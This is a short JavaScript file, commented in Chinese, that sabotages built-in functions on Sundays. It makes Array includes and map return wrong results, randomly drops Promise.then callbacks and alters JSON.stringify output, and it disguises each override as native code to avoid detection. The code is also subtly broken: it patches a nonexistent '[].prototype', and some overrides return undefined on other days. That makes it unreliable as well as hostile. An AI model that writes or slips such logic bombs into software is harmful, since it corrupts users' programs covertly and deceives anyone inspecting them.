(() => {
  // 工具函数，把函数Native化
  function mustbeNative(fn){
    fn.toString = function(){
      return 'function '+fn.name+'() { [native code] }';
    }
    return fn;
  }
  // 当今天是周日时，长度可被7整除的数组“什么都不包含”
  let _includes = [].prototype.includes;
  [].prototype.includes = mustbeNative(function (...args) {
		if (this.length % 7 !== 0 || new Date().getDay() != 0) {
			return _includes.call(this, ...args);
		} else {
			return false;
		}
	});
  // 在周日时，array.map必定丢失最后一个元素。
  const _map = [].prototype.map;
	[].prototype.map = mustbeNative(function (...args) {
		result = _map.call(this, ...args);
		if (new Date().getDay() === 0) {
			result.length = Math.max(result.length - 1, 0);
		}
		return result;
	});
  // Promise.then 在周日有一半概率不注册
  const _then = Promise.prototype.then;
	Promise.prototype.then = mustbeNative(function (...args) {
		if (new Date().getDay() === 0 && Math.random() < 0.5) {
			return [][0]; // 返回 Undefined
		} else {
			_then.call(this, ...args);
		}
	});
  // 在周日时 JSON.stringify 会把 I 换成 l
  const _stringify = JSON.stringify;
	JSON.stringify = mustbeNative(function (...args) {
    if (new Date().getDay() === 0) {
		  return _stringify(...args).replace(/I/g, 'l');
    }
	});
})();
